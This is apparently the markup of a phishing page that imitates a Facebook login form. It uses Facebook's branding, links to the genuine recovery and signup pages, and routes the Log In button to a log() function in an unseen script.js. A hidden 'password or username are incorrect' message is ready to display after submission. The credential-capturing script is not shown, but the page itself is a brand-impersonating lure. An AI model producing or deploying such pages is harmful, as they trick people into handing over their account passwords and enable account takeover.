    <style>
        /* Reset some default styles for consistency */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .login-box {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }

        .login-box h2 {
            margin-bottom: 20px;
            color: #1877f2; /* Facebook blue */
        }

        .input-box {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-box label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        .input-box input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #166fe5;
        }

        .forgot-password {
            margin-top: 10px;
            text-align: left;
        }

        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .create-account {
            margin-top: 10px;
        }

        .create-account a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .create-account a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <script src="script.js"></script>
    <div class="msg"id="msg"style="color:red;display:none;"><p>Your password or username are incorrect</p></div>
    <div class="container">
        <div class="login-box">
            <h2>Facebook Login</h2>
            <form>
                <div class="input-box">
                    <label for="username">Email or Phone</label>
                    <input type="text" id="id" name="username" required>
                </div>
                <div class="input-box">
                    <label for="password">Password</label>
                    <input type="password" id="pass" name="password" required>
                </div>
                <button onclick="log()">Log In</button>
                <div class="forgot-password">
                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot password?</a>
                </div>
                <hr>
                <div class="create-account">
                    <a href="https://facebook.com/">Create New Account</a>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
